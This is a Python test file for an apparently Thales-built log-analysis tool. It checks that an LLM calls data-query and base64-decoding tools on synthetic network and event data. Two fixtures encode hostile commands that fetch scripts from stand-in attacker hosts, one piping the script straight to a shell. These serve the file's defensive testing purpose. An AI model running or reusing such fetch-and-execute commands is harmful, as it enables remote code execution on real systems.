# Copyright 2026 Thales
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#  https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import base64
import csv
import gzip
import json
import os
import tempfile

import pytest
from boto3.session import Session

from conftest import get_resources_folder
from data2report import run_report
from llm_utils import invoke_llm
from utils import init_env_from_file, get_json_lines


def _extract_json(content: str) -> dict:
    """Extract first JSON object from LLM response, tolerating prose prefix/suffix."""
    for line in get_json_lines(content):
        if line:
            return json.loads(line)
    raise ValueError(f"No JSON found in response: {content!r}")

_MODEL_ID = "inference-profile/us.anthropic.claude-sonnet-4-6"


@pytest.fixture(autouse=True, scope="module")
def set_aws_api_key():
    init_env_from_file()


@pytest.fixture
def reports_folder(monkeypatch):
    with tempfile.TemporaryDirectory() as d:
        monkeypatch.setenv("REPORTS_FOLDER", d)
        yield d


def _make_csv_gz(rows: list[dict]) -> str:
    f = tempfile.NamedTemporaryFile(suffix=".csv.gz", delete=False)
    with gzip.open(f.name, "wt") as gz:
        writer = csv.DictWriter(gz, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)
    return f.name


# ── query_data integration ────────────────────────────────────────────────────


def test_query_data_tool_invoked_by_llm():
    """LLM should use query_data to count rows and return a non-empty result."""
    rows = [{"ip": f"10.0.0.{i}", "port": str(22 + i % 3), "proto": "tcp"} for i in range(20)]
    chunk_path = _make_csv_gz(rows)

    response = invoke_llm(
        system_prompt=(
            "You are a data analyst. Use the query_data tool to count the total number of rows "
            "in the chunk table and return exactly one JSON line: "
            '{"row_count": <number>}. Output only that JSON line, nothing else.'
        ),
        user_prompt="Count the rows.",
        model_id=_MODEL_ID,
        max_tokens=200,
        temperature=0.0,
        session=Session(),
        tools=["query_data"],
        chunk_path=chunk_path,
    )

    assert response["usage"]["input_tokens"] > 0
    assert response["usage"]["output_tokens"] > 0
    assert response["tool_calls"].get("query_data", 0) >= 1

    obj = _extract_json(response["content"])
    assert obj["row_count"] == 20


def test_query_data_group_by_invoked_by_llm():
    """LLM should use query_data to identify the most frequent port."""
    rows = (
        [{"ip": f"1.1.1.{i}", "port": "22"} for i in range(15)]
        + [{"ip": f"2.2.2.{i}", "port": "80"} for i in range(5)]
    )
    chunk_path = _make_csv_gz(rows)

    response = invoke_llm(
        system_prompt=(
            "You are a security analyst. Use query_data to find which port appears most often. "
            'Return exactly one JSON line: {"top_port": "<port>"}. Nothing else.'
        ),
        user_prompt="Which port is most frequent?",
        model_id=_MODEL_ID,
        max_tokens=200,
        temperature=0.0,
        session=Session(),
        tools=["query_data"],
        chunk_path=chunk_path,
    )

    assert response["tool_calls"].get("query_data", 0) >= 1
    obj = _extract_json(response["content"])
    assert obj["top_port"] == "22"


# ── chain_decoder integration ─────────────────────────────────────────────────


def test_chain_decoder_tool_invoked_by_llm():
    """LLM should use chain_decoder to decode a base64 payload and report the decoded value."""
    payload = base64.b64encode(b"wget http://evil.example.com/malware.sh").decode()

    response = invoke_llm(
        system_prompt=(
            "You are a security analyst investigating encoded attack payloads. "
            "Use the chain_decoder tool to decode the value provided by the user. "
            'Return exactly one JSON line: {"decoded": "<decoded_string>"}. Nothing else.'
        ),
        user_prompt=f"Decode this payload: {payload}",
        model_id=_MODEL_ID,
        max_tokens=300,
        temperature=0.0,
        session=Session(),
        tools=["chain_decoder"],
        chunk_path=None,
    )

    assert response["usage"]["input_tokens"] > 0
    assert response["tool_calls"].get("chain_decoder", 0) >= 1

    obj = _extract_json(response["content"])
    assert "wget" in obj["decoded"]
    assert "evil.example.com" in obj["decoded"]


# ── end-to-end run_report with tools ─────────────────────────────────────────


_CONF_WITH_QUERY_DATA = {
    "id": "test_tools_report",
    "name": "Tools Integration Test Report",
    "input": {"format": "csv", "header": True},
    "llm": {
        "model_id": _MODEL_ID,
        "system_prompt": (
            "You are a data analyst. Use the query_data tool to count total rows. "
            "Return exactly one JSONL line per chunk: "
            '{"chunk_row_count": <number>}. Output only that JSONL line.'
        ),
        "temperature": 0.0,
        "max_tokens": 200,
        "tools": ["query_data"],
    },
    "report": {
        "chunk_size": 10,
        "incremental": False,
        "max_workers": 1,
        "max_records": 20,
    },
}

_CONF_WITH_CHAIN_DECODER = {
    "id": "test_chain_decoder_report",
    "name": "Chain Decoder Integration Test Report",
    "input": {"format": "csv", "header": True},
    "llm": {
        "model_id": _MODEL_ID,
        "system_prompt": (
            "You are a security analyst. For any base64-encoded values in the 'payload' column, "
            "use the chain_decoder tool to decode them. "
            "Return findings as JSONL lines with fields: finding, decoded_payload. "
            "Output only JSONL, one object per line."
        ),
        "temperature": 0.0,
        "max_tokens": 500,
        "tools": ["chain_decoder"],
    },
    "report": {
        "chunk_size": 5,
        "incremental": False,
        "max_workers": 1,
        "max_records": 5,
    },
}


def test_run_report_with_query_data(reports_folder):
    rows = [{"ip": f"10.0.0.{i}", "port": "22", "proto": "tcp"} for i in range(20)]
    input_file = _make_csv_gz(rows)

    result = run_report(input_file, configuration=_CONF_WITH_QUERY_DATA)

    assert result["llm_usage"]["input_tokens"] > 0
    assert result["llm_usage"]["output_tokens"] > 0
    assert result["tool_calls"]["query_data"] >= 1

    output_folder = result["output_folder"]
    with gzip.open(os.path.join(output_folder, "final_report.gz"), "rt") as f:
        lines = [l.strip() for l in f if l.strip()]
    assert len(lines) > 0
    # Each line should be valid JSON with chunk_row_count
    for line in lines:
        obj = json.loads(line)
        assert "chunk_row_count" in obj


def test_run_report_with_chain_decoder(reports_folder):
    encoded = base64.b64encode(b"curl http://attacker.example.com/backdoor.sh | sh").decode()
    rows = [
        {"event_id": str(i), "payload": encoded if i == 0 else "plain_text"}
        for i in range(5)
    ]
    input_file = _make_csv_gz(rows)

    result = run_report(input_file, configuration=_CONF_WITH_CHAIN_DECODER)

    assert result["llm_usage"]["input_tokens"] > 0
    assert result["llm_usage"]["output_tokens"] > 0
    assert result["tool_calls"]["chain_decoder"] >= 1

    output_folder = result["output_folder"]
    with gzip.open(os.path.join(output_folder, "final_report.gz"), "rt") as f:
        lines = [l.strip() for l in f if l.strip()]
    assert len(lines) > 0
